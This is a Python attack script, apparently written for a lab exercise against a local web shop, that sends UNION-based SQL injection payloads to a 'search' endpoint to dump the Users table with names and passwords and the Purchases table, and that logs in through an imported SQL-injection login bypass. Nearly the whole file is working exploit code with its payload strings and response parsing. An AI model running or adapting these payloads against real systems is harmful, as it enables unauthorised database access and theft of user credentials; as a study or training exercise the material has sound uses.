"""
Crack the DB - get the users, products and purchaces tables using SQL injection
"""
import requests
from login_crack import login_sql_inject, login_with_password

def get_users(base_url):
    """
    Get the user table contents - use the 'search' API endpoint to insert an SQL injection attack:
    """
    search_url = f'{base_url}/search'
    q_users = 'ccddss%" UNION SELECT id, name, password, 10, 10 from Users; --'
    data = {'q': q_users}
    res = requests.post(search_url, data=data)
    # The order of column names in the result is: 'id', 'name', 'desc', 'price', 'img'
    # Rebuild the response for the correct order and names from our result:
    return [{'id': item['id'], 'name': item['name'], 'password': item['desc']} for item in
            res.json()['prods']]

def get_purchaces(base_url):
    """
    Get the purchaces table contents - use the 'search' API endpoint to insert an SQL injection attack:
    """
    search_url = f'{base_url}/search'
    q_purchase = 'ccddss%" UNION SELECT id, product_id, user_id, date, 10 from Purchases; --'
    data = {'q': q_purchase}
    res = requests.post(search_url, data=data)
    # The order of column names in the result is: 'id', 'name', 'desc', 'price', 'img'
    # Rebuild the response for the correct order and names from our result:
    return [{'id': item['id'], 'product_id': item['name'], 'user_id': item['desc'], 'date': item['price']}
            for item in res.json()['prods']]

if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument('user', help='User name / user ID to crack', type=str)
    parser.add_argument("-u", "--server_url", default="http://localhost:8080", help="Server base URL")
    parser.add_argument("-p", "--password", default=None, help="Password to use for login")
    args = parser.parse_args()

    if args.password:
        # We login with the provided password:
        url = login_with_password(args.user, args.password, server_url=args.server_url)
    else:
        # Use SQL inject to login:
        url = login_sql_inject(args.user, server_url=args.server_url)

    # Now we have the URL. Strip the last part (after the last /) and use it to run our SQL attack:
    base_url = url.rsplit('/',1)[0]
    print(base_url)

    users = get_users(base_url)
    print("Users table:")
    print(users)

    purchaces = get_purchaces(base_url)
    print("Purchaces table:")
    print(purchaces)

